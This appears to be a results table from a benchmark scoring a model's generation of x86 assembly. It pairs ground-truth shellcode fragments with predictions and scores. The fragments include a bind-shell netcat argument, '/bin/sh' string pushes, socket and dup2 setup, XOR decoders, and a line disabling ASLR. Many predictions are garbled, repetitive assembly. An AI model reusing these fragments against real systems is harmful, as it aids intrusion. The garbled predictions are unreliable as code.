Ground Truth Snippets;Predicted Snippets;Score Semantic Equivalence
decoder: \\n pop esi \\n mov edi, esi;pop esi \\n mov edi, [esi];GT: errorGenEXE
push 0x68736162;push 0x68736162;1
mov eax, 63;mov eax, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;GT: errorGenEXE
mov al,0xa2 \\n int 80h;int 0x80;GT: errorGenEXE
push eax \\n mov ebx, esp;push eax \\n mov ebx, esp;1
xchg byte [esi+1], al;inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc;0
jmp short enc;jmp short enc;1
mov al,0x8 \\n mov cl,077o;reate: \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n mov 0x77, 0x;0
stage:;_stage:;GT: errorGenEXE
mov dl, 0x45;mov dl, 0x45;1
inc esi \\n jmp L1;inc L2 \\n jmp L2;0
movq mm0, qword [edi];mov mm0, \xor_value\;0
mov byte [esi], dl;mov dl, byte [esi];GT: errorGenEXE
inc edi;inc edi;1
xor eax, [edi];xor eax, edi;GT: errorGenEXE
mov al, 0x17;xor 0x17, 0x17;0
mov [esi+35], esi;mov esi+35, esi;0
dec ecx;dec ecx;1
push word 0x3436;push word 0x3436;1
call jmp_search;call jmp_search;1
write_syscall equ 4;write_syscall equ 4;1
cmp BYTE [esi], 0x7 \\n jle lowbound;cmp BYTE [esi], 0x7 \\n jl lowbound;GT: errorGenEXE
add eax, 2;add eax, 2;1
push byte 4 \\n pop eax;push byte 4 \\n pop eax;1
push 0x64687373 \\n mov edi, esp;push 0x64687373 \\n mov edi, esp;1
jmp short four;jmp short four;1
xchg ebx, eax;xchg ebx, eax;1
buffersize: dw 1024;buffersize word 0x68732f \\n 0x68732f \\n 0x6e69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0;0
pop esi \\n mov bx, [esi];pop esi \\n mov bx, [esi];1
push eax \\n push 0x636e2f6e \\n push 0x69622f2f;push 0-term \\n push cn/n \\n push ib//;0
push 0x2;push for \\n push af_inet;GT: errorGenEXE
mov ecx, eax;mov ecx, eax;1
push word 0x8223;push word 0x8223;1
push 0x1ff9090 \\n pop ecx;push 0x1ff9090 \\n push ecx \\n push 0x10 \\n push 0x1ff9090 \\n push ecx \\n push 0x10 \\n mov 0x10, esp;0
cmp edx, 42;cmp edx, 42;1
push esi;push sockfd;GT: errorGenEXE
close:;close_label:;GT: errorGenEXE
pop ecx \\n loop l1 \\n mov eax, 1;pop ecx \\n dec ecx \\n jmp l1;GT: errorGenEXE
matrix qw 12*10;for: \\n 12*10: \\n quad-bytes:;0
F5: \\n jmp L1;F5: \\n jmp L1;1
mov bl, 0xe;mov bl, 0xe;1
mov al, 0x01;mov byte [eax], 0x1;GT: errorGenEXE
R1: \\n inc esi \\n inc esi;inc R1 \\n inc esi;0
xor byte [esi], 0x2c;xor 0x2c, esi;0
mov edi, 0x978cd092 \\n mov ebx, edi;push 0x978cd092 \\n pop edi \\n pop ebx;GT: errorGenEXE
mov ebx, esp;mov ebx, ptr;0
lea ebx, [esp];mov ebx, esp;GT: errorGenEXE
push 0x74756f2f;push 0x74756f2f;1
loop bucle;dec ecx \\n jns bucle;GT: errorGenEXE
push 0x3a303a3a;push 0x3a303a3a;1
jns loop2;jns _loop2;GT: errorGenEXE
push 0x30;push 0x30;1
S1: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73;0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73;0
F1: \\n pop esi;F1: \\n pop esi;1
push 0x68732f2f \\n push 0x6e69622f \\n mov eax, esp;mov eax, ASCII /bin/sh;0
mov cx, 2001Q;mov cx, 2001Q;1
jne no_error;jne no_error;1
cmp cl, 0x11 \\n jb 0xff \\n add dl, 0x5;cmp cl, 0x11 \\n add dl, 0x5;GT: errorGenEXE
xor eax, 0x58494741;xor eax, 0x58494741;1
L3: \\n jmp edi;L3: \\n jmp edi;1
push ebx;push ebx;1
xor ecx, ecx \\n mov cl, shellcode_length;xor shellcode_length, shellcode_length \\n mov byte [shellcode_length], shellcode_length;0
mov al, 0x42;mov al, 0x42;1
mov byte [esp], 0x2f;mov byte [var1], 0x2f;GT: errorGenEXE
xor ebx, ebx \\n xor edx, edx;xor ebx, ebx \\n mul ebx;GT: errorGenEXE
mov dword [esp-4], esi;mov dword [[], esi;0
mov [esi], al;mov esi, al;0
xor ecx, ecx \\n mul ecx;xor eax, eax \\n xor ecx, ecx;GT: errorGenEXE
jmp short decode_pr;decode_pr: \\n inc decode_pr;0
function_5: \\n call [esp];function_5: \\n int 0x80;GT: errorGenEXE
mov cl, 100;mov cl, 100;1
xchg esi, eax;mov esi, esp;GT: errorGenEXE
mov al, 0x66;mov al, 0x66;1
xor edx, edx \\n push edx;push edx;GT: errorGenEXE
loop l4 \\n mov edx, esp;loop l4 \\n mov edx, esp;1
sub ecx,ecx \\n push ecx;xor ecx, ecx \\n push ecx;GT: errorGenEXE
shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb;shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb;1
mov edx, ecx;mov edx, ecx;1
test eax, eax \\n jz short loc_402B13;test eax, eax \\n jz short loc_402B13;1
add eax, 0x10;add eax, 0x10;1
mov ecx, ebp;mov ecx, ebp;1
push 0x1;push socket_type \\n push = \\n push sock_stream;0
add ax, [di + 20];add ax, di + 20;0
mov al,0x6;mov al, 0x68732f2f \\n mov al, 0x68732f \\n mov al, 0x6e69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x6e69622f \\n mov al, 0x69622f \\n mov al, 0x6e69622f \\n mov al, 0x69622;GT: errorGenEXE
dec esp;dec esp;1
push eax;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
sub eax,20000h;sub eax, 20000h;1
section .bss;section \\n uninitialized: db 0x68732f2f \\n db 0x6e69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f2f \\n db 0x69622;GT: errorGenEXE
pop cx;pop cx;1
push 0x6475732f \\n push 0x6374652f \\n mov eax, esp;push 0x6475732f \\n push 0x6374652f \\n mov eax, esp;1
mov ecx, esp;mov ecx, args;GT: errorGenEXE
cmp al, 0xf2;cmp al, 0xf2;1
db 0c6h;db '0c6h';GT: errorGenEXE
cmp eax, eax \\n jne 0x8;cmp eax, eax \\n jne 0x8;1
xor ax, 0x3041;xor ax, 0x3041;1
jnz decode;jz _decode;GT: errorGenEXE
pop ecx \\n mov edi, ecx;pop ecx \\n pop stak \\n mov edi, esp;0
add eax, ebx;add eax, ebx;1
push 0x2f2f2f2f \\n mov esi, esp;push 0x2f2f2f2f \\n mov esi, esp;1
mov cl, al;backup al;0
push ecx;push host_sockfd;GT: errorGenEXE
find_address:;find_address:;1
shl edx, 9;shl edx, 9;1
dup2:;_dup2:;GT: errorGenEXE
three:;_three:;GT: errorGenEXE
L1: \\n jmp short esp;jmp short esp;GT: errorGenEXE
push byte 10;push byte 10;1
wrap_around:;_wrap_around:;GT: errorGenEXE
cmp bl, 78h \\n jge short loc_402B1D;cmp bl, 78h \\n jge loc_402B1D;GT: errorGenEXE
_start: \\n jmp short enc;_start: \\n jmp short enc;1
push word 0x5c11;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
read:;read_label:;GT: errorGenEXE
mov bl, byte [edi];mov bl, byte [edi];1
db '/bin/sh';db '/bin/sh';1
priv_setgid:;_ priv_setgid:;0
sub edx, edx;xor edx, edx;GT: errorGenEXE
mov bl, 4;mov: \\n =: \\n var2: \\n sys_listen: \\n bl:;0
mov ecx, esp;mov ecx, ptr;0
mov ebx, esp;ebx:;0
cdq \\n push edx;xor edx, edx \\n push edx;GT: errorGenEXE
xor bl, 0xaa \\n jne encodedshellcode;xor bl, 0xaa \\n jnz encodedshellcode;GT: errorGenEXE
xor edx, edx;xor edx, edx;1
push 0x6374652f \\n mov esi, esp;push 0x6374652f \\n mov esi, esp;1
push byte 0x2 \\n pop eax;push byte 0x2 \\n pop eax;1
sub ecx, ecx;sub ecx, ecx;1
xor edx, edx \\n mov dl, 5;xor edx, edx \\n mov byte [edx], 5;GT: errorGenEXE
jmp short stage;jmp short _stage;GT: errorGenEXE
sub ax, 1564;sub ax, 1564;1
shell_ret:;shell_ret:;1
mov cx,0x3b30 \\n push cx;push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n;0
cmp byte [buff], 7ah;cmp byte [buff], 7ah;1
push 0x67513231;push 0x67513231;1
push 2;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x;GT: errorGenEXE
push 0x10;push 0x10;1
push eax \\n pop edx;mov edx, eax;GT: errorGenEXE
message: db 'hello world!';message db 'hello world!';GT: errorGenEXE
mov eax, 3;mov sys_read, esp;0
db 'egg mark';db 'egg mark';1
xor edx, edx;xor edx, edx;1
jmp short push_cmd;jmp short push_cmd;1
decode:;decode:;1
xor cl, 0x32;xor cl, 0x32;1
cmp bl, 0xbb \\n je xordecode \\n jmp notdecode;cmp bl, 0xbb \\n jge xordecode \\n jmp notdecode;GT: errorGenEXE
mov ebx, [ebp-4];push [\\n pop ebp-4 \\n pop] \\n pop ebx;0
push byte +0x68;push byte +0x68;1
mov cx, 0700;mov cx, 0700;1
cdq;edx:;0
mov al, 0xcd;mov al, 0xcd;1
xor cl, 0xaa;xor cl, 0xaa;1
cmp al, 0xf2;cmp al, 0xf2;1
mov al, 11;mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f;GT: errorGenEXE
push 15 \\n mov ecx, esp;push ecx \\n mov ecx, 15;GT: errorGenEXE
xchg eax, ebx;xchg eax, ebx;1
push byte 16 \\n pop eax;push byte 16 \\n pop eax;1
mov long [esi+26], eax;mov eax, [esi+26];GT: errorGenEXE
mov dword [esp-0x4],eax \\n mov dword [esp-0x8],0x65636170 \\n mov dword [esp-0xc],0x735f6176 \\n mov dword [esp-0x10],0x5f657a69 \\n mov dword [esp-0x14],0x6d6f646e \\n mov dword [esp-0x18],0x61722f6c \\n mov dword [esp-0x1c],0x656e7265 \\n mov dword [esp-0x20],0x6b2f7379 \\n mov dword [esp-0x24],0x732f636f \\n mov dword [esp-0x28],0x72702f2f \\n sub esp,0x28 \\n mov ebx,esp;push proc/sys/kernel/randomize_va_space \\n push eax \\n mov ebx, esp;0
mov bl, 0x2;mov bl, 0x2;1
push 0x37333333 \\n push 0x3170762d;push '-vp13337';GT: errorGenEXE
push 0x2f2f2f2f;push 0x2f2f2f2f;1
lea esi, [esi +4];push [\\n pop esi +4;0
scasd;cmp dword [edi], eax;GT: errorGenEXE
mov ecx,esp;mov ecx, esp;1
mov eax, [ebx+8];mov eax, byte [ebx+8];0
bound esp,qword ptr [ebx+0x41];bound ebx, 0x68732f2f, 0x6e69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f;0
push ebx;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
int 3;mov breakpoint, esp;0
xor ecx, ecx \\n xor eax, eax \\n xor edx, edx;xor ecx, ecx \\n xor eax, eax \\n xor edx, edx;1
push 0x10 \\n push ecx \\n push edx;push sizeof(struct;0
cmp bl, 0xaa \\n je shellcode;cmp bl, 0xaa \\n jz shellcode;GT: errorGenEXE
push edx \\n mov ecx, esp;push edx \\n mov ecx, esp;1
mov bl, 0xff;pop bl;0
xor eax, eax \\n xor edx, edx;xor eax, eax \\n xor edx, edx;1
mov al,2;mov al, __nr_fork;GT: errorGenEXE
cmp ecx, ebp;cmp ecx, ebp;1
xchg esp, esi;xchg esi, esp;GT: errorGenEXE
